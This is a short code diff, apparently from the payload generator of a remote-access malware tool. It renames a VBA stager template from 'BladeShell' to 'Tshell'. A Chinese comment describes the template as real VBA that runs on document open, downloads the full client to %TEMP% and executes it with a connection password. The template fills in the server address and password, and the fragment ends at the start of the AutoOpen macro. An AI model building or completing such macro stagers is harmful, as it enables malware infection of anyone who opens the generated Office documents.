@@ -111,7 +111,7 @@ async function handleGenerate() {
   }
 
   // 真实 VBA：AutoOpen/Document_Open 下载完整客户端到 %TEMP% 并携带上线密码执行
-  const vbaCode = `' BladeShell MS Office VBA Stager
+  const vbaCode = `' Tshell MS Office VBA Stager
 ' Payload: ${serverAddress}
 ' Pass: ${pass}
 Sub AutoOpen()
